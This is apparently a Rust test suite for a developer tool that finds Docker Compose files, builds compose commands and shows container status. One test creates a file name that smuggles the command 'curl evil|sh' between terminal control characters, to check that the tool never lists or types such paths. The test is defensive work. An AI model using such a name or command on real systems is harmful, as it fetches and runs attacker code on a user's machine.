            "on_premises_v2/docker-compose.raid.yml",
            "on_premises_v2/docker-compose.yml",
            "ref_programs/influx_v3/docker-compose.yml",
        ];
        for f in expected {
            touch(&root, f);
        }
        // Not compose files, or in folders that are skipped or unreadable.
        touch(&root, "mobile-web-app/node_modules/x/.travis.yml");
        touch(&root, "backend/config/settings.yml");
        let locked = root.join("postgres");
        std::fs::create_dir_all(&locked).unwrap();
        std::fs::set_permissions(&locked, std::os::unix::fs::PermissionsExt::from_mode(0o000)).unwrap();
        let mut got = rels(scan(&root));
        std::fs::set_permissions(&locked, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        let mut want: Vec<String> = expected.iter().map(|s| s.to_string()).collect();
        want.sort();
        got.sort();
        assert_eq!(got, want);
    }

    #[test]
    fn files_with_control_characters_in_their_path_are_never_listed() {
        let root = tmp("control-chars");
        touch(&root, "docker-compose.yml");
        // Legal in git; typed into a terminal, \x15 erases the line and \r runs it.
        touch(&root, "docker-compose.\x15curl evil|sh\r.yml");
        touch(&root, "evil\x1b[2J/compose.yml");
        assert_eq!(rels(scan(&root)), ["docker-compose.yml"]);
        let cmd = vec!["docker".to_string(), "compose".to_string()];
        let bad = Path::new("/r/docker-compose.\x15x\r.yml");
        assert!(typed_command(&cmd, bad, Path::new("/r"), &Action::Up)
            .chars()
            .all(|c| !c.is_control()));
    }

    #[test]
    fn scan_respects_depth_and_skips() {
        let root = tmp("depth");
        touch(&root, "1/2/3/4/compose.yml");
        touch(&root, "1/2/3/4/5/compose.yml");
        for skipped in ["node_modules/x", ".git", ".hidden", "target", "vendor", ".venv"] {
            touch(&root, &format!("{skipped}/compose.yml"));
        }
        assert_eq!(rels(scan(&root)), ["1/2/3/4/compose.yml"]);
    }

    #[test]
    fn scan_caps_files_and_folders() {
        let root = tmp("caps");
        for i in 0..60 {
            touch(&root, &format!("s{i:02}/compose.yml"));
        }
        assert_eq!(scan(&root).len(), 50);
        let few = scan_limited(
            &root,
            &Limits {
                max_depth: 4,
                max_files: 50,
                max_dirs: 10,
            },
        );
        assert!(few.len() <= 10, "stops after max_dirs folders, got {}", few.len());
    }

    #[test]
    fn scan_does_not_follow_symlinked_folders() {
        let root = tmp("links");
        let other = tmp("links-other");
        touch(&other, "compose.yml");
        std::os::unix::fs::symlink(&root, root.join("loop")).unwrap();
        std::os::unix::fs::symlink(&other, root.join("linked")).unwrap();
        let rels = rels(scan(&root));
        assert!(!rels.iter().any(|r| r.starts_with("loop") || r.starts_with("linked")), "{rels:?}");
    }

    #[test]
    fn repo_root_is_git_toplevel_or_the_folder() {
        let root = tmp("repo");
        std::fs::create_dir_all(root.join("sub")).unwrap();
        let ok = std::process::Command::new("git")
            .args(["init", "-q"])
            .current_dir(&root)
            .status()
            .unwrap();
        assert!(ok.success());
        assert_eq!(repo_root(&root.join("sub")), root.canonicalize().unwrap());
        let plain = tmp("not-a-repo");
        assert_eq!(repo_root(&plain), plain);
    }

    fn cf(rel: &str, services: Option<&[&str]>) -> ComposeFile {
        ComposeFile {
            path: PathBuf::from("/repo").join(rel),
            rel: PathBuf::from(rel),
            services: services.map(|s| s.iter().map(|n| n.to_string()).collect()),
        }
    }

    #[test]
    fn only_up_and_up_d_are_remembered_newest_first() {
        let mut l = Vec::new();
        let a = Path::new("/repo/a.yml");
        let b = Path::new("/repo/b.yml");
        assert!(record_start(&mut l, a, &Action::UpDetached, 1));
        assert!(record_start(&mut l, b, &Action::Up, 2));
        for other in [Action::Down, Action::Logs, Action::Restart, Action::Stop, Action::UpBuild] {
            assert!(!record_start(&mut l, a, &other, 3), "{other:?}");
        }
        assert_eq!(
            l.iter().map(|s| (s.path.as_path(), s.detached)).collect::<Vec<_>>(),
            vec![(b, false), (a, true)]
        );
        // The same file and action again moves to the front instead of repeating.
        assert!(record_start(&mut l, a, &Action::UpDetached, 9));
        assert_eq!(l.len(), 2);
        assert_eq!((l[0].path.as_path(), l[0].at), (a, 9));
        // The same file with the other action is a separate start.
        assert!(record_start(&mut l, a, &Action::Up, 10));
        assert_eq!(l.len(), 3);
        assert_eq!(l[0].action(), Action::Up);
        assert_eq!(l[1].action(), Action::UpDetached);
    }

    #[test]
    fn starts_are_capped_and_survive_json() {
        let mut l = Vec::new();
        for n in 0..(MAX_STARTS + 5) {
            record_start(&mut l, Path::new(&format!("/repo/{n}.yml")), &Action::Up, n as i64);
        }
        assert_eq!(l.len(), MAX_STARTS);
        assert_eq!(l[0].at, (MAX_STARTS + 4) as i64);
        let back: Vec<Start> = serde_json::from_str(&serde_json::to_string(&l).unwrap()).unwrap();
        assert_eq!(back, l);
    }

    #[test]
    fn recent_starts_are_the_newest_three_of_this_repo() {
        let files = [cf("a.yml", None), cf("b.yml", None), cf("c.yml", None), cf("d.yml", None)];
        let mut l = Vec::new();
        // `elsewhere.yml` is another repo's file: never shown here.
        for (p, t) in [
            ("/repo/a.yml", 1),
            ("/other/elsewhere.yml", 2),
            ("/repo/b.yml", 3),
            ("/repo/c.yml", 4),
            ("/repo/d.yml", 5),
        ] {
            record_start(&mut l, Path::new(p), &Action::UpDetached, t);
        }
        let got: Vec<_> = recent_starts(&l, &files, 3).iter().map(|s| s.at).collect();
        assert_eq!(got, vec![5, 4, 3]);
        assert!(recent_starts(&[], &files, 3).is_empty());
    }

    #[test]
    fn short_names() {
        assert_eq!(short_name("docker-compose-local-infra.yml"), "local-infra");
        assert_eq!(short_name("docker-compose-with-redundancy.yaml"), "with-redundancy");
        assert_eq!(short_name("docker-compose.yml"), "docker-compose");
        assert_eq!(short_name("compose.yaml"), "compose");
        assert_eq!(short_name("docker-compose-.yml"), "docker-compose-");
    }

    #[test]
    fn the_filter_matches_file_names_and_service_names() {
        let f = cf("backend/docker-compose-with-server-1.yml", Some(&["web", "Redis_Server"]));
        assert!(matches_query(&f, ""));
        assert!(matches_query(&f, "  "));
        assert!(matches_query(&f, "SERVER-1"));
        assert!(matches_query(&f, "redis"));
        assert!(!matches_query(&f, "kafka"));
        // A file whose YAML did not parse still matches by name.
        let broken = cf("compose.yml", None);
        assert!(matches_query(&broken, "compose"));
        assert!(!matches_query(&broken, "redis"));
    }

    #[test]
    fn matches_are_split_for_highlighting() {
        let join = |v: Vec<(String, bool)>| v.iter().map(|(t, _)| t.as_str()).collect::<String>();
        let v = split_matches("web, Redis, redis_server", "redis");
        assert_eq!(
            v,
            vec![
                ("web, ".to_string(), false),
                ("Redis".to_string(), true),
                (", ".to_string(), false),
                ("redis".to_string(), true),
                ("_server".to_string(), false),
            ]
        );
        assert_eq!(join(v), "web, Redis, redis_server");
        assert_eq!(split_matches("web", ""), vec![("web".to_string(), false)]);
        assert_eq!(split_matches("web", "zzz"), vec![("web".to_string(), false)]);
        // Non-ASCII text is never cut inside a character.
        assert_eq!(join(split_matches("café-redis", "redis")), "café-redis");
        assert_eq!(join(split_matches("ÉÉ", "é")), "ÉÉ");
    }

    #[test]
    fn action_args() {
        assert_eq!(Action::Up.args(), ["up"]);
        assert_eq!(Action::UpDetached.args(), ["up", "-d"]);
        assert_eq!(Action::Logs.args(), ["logs", "-f"]);
        assert_eq!(Action::UpBuild.args(), ["up", "--build"]);
        assert_eq!(Action::RestartService("api".into()).args(), ["restart", "api"]);
        assert_eq!(Action::from_setting("up -d"), Some(Action::UpDetached));
        assert_eq!(Action::from_setting("nope"), None);
        assert!(Action::Up.holds_pane() && Action::Logs.holds_pane() && Action::UpBuild.holds_pane());
        assert!(!Action::UpDetached.holds_pane() && !Action::Down.holds_pane());
    }

    #[test]
    fn quoting() {
        assert_eq!(shell_quote("services/api/compose.yaml"), "services/api/compose.yaml");
        assert_eq!(shell_quote("my app/compose.yml"), "'my app/compose.yml'");
        assert_eq!(shell_quote("it's/compose.yml"), "'it'\\''s/compose.yml'");
    }

    #[test]
    fn file_path_is_relative_to_the_panes_folder_when_inside_it() {
        let f = Path::new("/r/services/api/compose.yaml");
        assert_eq!(file_arg(f, Path::new("/r")), "services/api/compose.yaml");
        assert_eq!(file_arg(f, Path::new("/r/services/api")), "compose.yaml");
        assert_eq!(file_arg(f, Path::new("/r/web")), "/r/services/api/compose.yaml");
    }

    #[test]
    fn typed_command_text() {
        let cmd = vec!["docker".to_string(), "compose".to_string()];
        assert_eq!(
            typed_command(&cmd, Path::new("/r/my app/compose.yml"), Path::new("/r"), &Action::Up),
            "docker compose -f 'my app/compose.yml' up"
        );
        assert_eq!(
            argv(&cmd, Path::new("/r/compose.yml"), &Action::Stop),
            ["docker", "compose", "-f", "/r/compose.yml", "stop"]
        );
    }

    #[test]
    fn compose_command_detection() {
        let only = |ok: &'static [&'static str]| move |c: &[&str]| c == ok;
        assert_eq!(
            detect_command("", only(&["docker", "compose"])),
            Some(vec!["docker".into(), "compose".into()])
        );
        assert_eq!(detect_command("", only(&["docker-compose"])), Some(vec!["docker-compose".into()]));
        assert_eq!(
            detect_command("", only(&["podman", "compose"])),
            Some(vec!["podman".into(), "compose".into()])
        );
        assert_eq!(detect_command("", |_| false), None);
        assert_eq!(
            detect_command("/opt/d compose", |_| false),
            Some(vec!["/opt/d".into(), "compose".into()])
        );
    }

    const ONE: &str = r#"{"Service":"api","State":"running","Health":"","ExitCode":0,"Publishers":[{"URL":"0.0.0.0","TargetPort":8000,"PublishedPort":8000,"Protocol":"tcp"}]}"#;
    const TWO: &str = r#"{"Service":"db","State":"exited","Health":"","ExitCode":1,"Publishers":[]}"#;

    fn svc(state: State, health: &str, code: i32) -> ServiceStatus {
        ServiceStatus {
            service: "api".into(),
            state,
            health: health.into(),
            exit_code: code,
            ports: vec![],
        }
    }

    #[test]
    fn ps_parses_array_and_line_formats_alike() {
        let lines = parse_ps(&format!("{ONE}\n{TWO}\n")).unwrap();
        let array = parse_ps(&format!("[{ONE},{TWO}]")).unwrap();
        assert_eq!(lines, array);
        assert_eq!(lines[0].service, "api");
        assert_eq!(lines[0].ports, [8000]);
        assert_eq!(lines[1].state, State::Exited);
        assert_eq!(lines[1].exit_code, 1);
        assert_eq!(parse_ps("").unwrap(), []);
        assert!(parse_ps("not json").is_err());
        assert_eq!(
            ps_argv(&["docker".into(), "compose".into()], Path::new("/r/compose.yml")),
            ["docker", "compose", "-f", "/r/compose.yml", "ps", "--all", "--format", "json"]
        );
    }

    #[test]
    fn ps_keeps_only_the_files_own_services() {
        // Two files in one folder share a Compose project, so `ps -f faketime.yml`
        // also lists the containers `docker-compose.yml` started.
        let named = |s: &str| ServiceStatus {
            service: s.into(),
            ..svc(State::Exited, "", 0)
        };
        let ps = vec![named("backend"), named("postgres"), named("redis")];
        let declared = vec!["backend".to_string()];
        let services = |v: Vec<ServiceStatus>| v.into_iter().map(|s| s.service).collect::<Vec<_>>();
        assert_eq!(services(only_declared(ps.clone(), Some(&declared))), ["backend"]);
        assert_eq!(
            services(only_declared(ps.clone(), None)),
            ["backend", "postgres", "redis"],
            "services unknown: show every container rather than none"
        );
        assert_eq!(services(only_declared(ps, Some(&[]))), Vec::<String>::new());
    }

    #[test]
    fn declared_services_come_from_compose_config() {
        assert_eq!(
            services_argv(&["docker".into(), "compose".into()], Path::new("/r/compose.yml")),
            ["docker", "compose", "-f", "/r/compose.yml", "config", "--services"]
        );
        assert_eq!(parse_services("backend\n  web \n\n"), Some(vec!["backend".into(), "web".into()]));
        assert_eq!(parse_services(""), None, "no answer: fall back to reading the file");
    }

    #[test]
    fn chip_tone_follows_state_health_and_exit_code() {
        use Tone::*;
        let t = |state, health, code| tone(&svc(state, health, code), false);
        assert_eq!(t(State::Running, "", 0), Up, "running without a healthcheck");
        assert_eq!(t(State::Running, "healthy", 0), Up);
        assert_eq!(t(State::Running, "starting", 0), Pending);
        assert_eq!(t(State::Running, "unhealthy", 0), Down);
        assert_eq!(t(State::Restarting, "", 1), Down, "crash loop under a restart policy");
        assert_eq!(t(State::Restarting, "", 0), Pending);
        assert_eq!(t(State::Exited, "", 1), Down);
        assert_eq!(t(State::Exited, "", 0), Idle, "a one-shot job that finished");
        assert_eq!(t(State::Other, "", 0), Idle, "created or paused");
        assert_eq!(t(State::Exited, "", 137), Down, "killed (OOM) while nobody was stopping");
        assert_eq!(tone(&svc(State::Exited, "", 137), true), Idle, "killed by the user's stop");
        for (tone, class) in [
            (Up, "compose-up"),
            (Pending, "compose-pending"),
            (Down, "compose-down"),
            (Idle, "compose-idle"),
        ] {
            assert_eq!(tone.css_class(), class);
        }
    }

    #[test]
    fn stack_tone_is_its_worst_service() {
        use Tone::*;
        let up = svc(State::Running, "", 0);
        let done = svc(State::Exited, "", 0);
        let starting = svc(State::Running, "starting", 0);
        let crashed = svc(State::Exited, "", 1);
        assert_eq!(stack_tone(&[], false), Pending, "nothing created yet");
        assert_eq!(stack_tone(std::slice::from_ref(&up), false), Up);
        assert_eq!(stack_tone(&[up.clone(), done.clone()], false), Up, "finished init jobs are fine");
        assert_eq!(stack_tone(&[up.clone(), starting], false), Pending);
        assert_eq!(stack_tone(&[up, crashed], false), Down);
        assert_eq!(stack_tone(&[done], false), Idle);
    }

    #[test]
    fn crash_detection() {
        let up = [svc(State::Running, "", 0)];
        let exited = |code| [svc(State::Exited, "", code)];
        assert_eq!(crashes(&up, &exited(1), false)[0].title(), "api exited with code 1");
        assert!(crashes(&up, &exited(0), false).is_empty(), "clean exit");
        assert!(crashes(&exited(1), &exited(1), false).is_empty(), "once per crash");
        assert_eq!(
            crashes(&up, &[svc(State::Running, "unhealthy", 0)], false)[0].title(),
            "api is unhealthy"
        );
        assert!(crashes(
            &[svc(State::Running, "unhealthy", 0)],
            &[svc(State::Running, "unhealthy", 0)],
            false
        )
        .is_empty());
        // A stop the user started: containers killed by SIGINT/SIGKILL/SIGTERM are not crashes.
        for code in [130, 137, 143] {
            assert!(crashes(&up, &exited(code), true).is_empty(), "stopping, exit {code}");
            assert_eq!(crashes(&up, &exited(code), false).len(), 1, "not stopping: exit {code} is a crash");
        }
        assert_eq!(crashes(&up, &exited(1), true).len(), 1, "exit 1 is a crash even while stopping");
    }

    #[test]
    fn bar_stays_while_starting_and_hides_when_nothing_runs() {
        let running = [svc(State::Running, "", 0)];
        let crashed = [svc(State::Exited, "", 1)];
        assert!(
            !stack_should_hide(false, &[], true, false),
            "first up still pulling: pane busy, no containers yet"
        );
        assert!(!stack_should_hide(true, &running, false, false));
        assert!(stack_should_hide(true, &[], false, false), "stopped outside oxishell");
        assert!(
            stack_should_hide(false, &[], false, false),
            "up -d failed and returned to the prompt"
        );
        assert!(
            !stack_should_hide(true, &crashed, false, false),
            "a crashed service keeps the bar so its red chip and Restart stay"
        );
        assert!(stack_should_hide(true, &crashed, false, true), "a stop the user started removes it");
        assert!(
            stack_should_hide(true, &[svc(State::Exited, "", 137)], false, true),
            "killed by the stop"
        );
    }
}
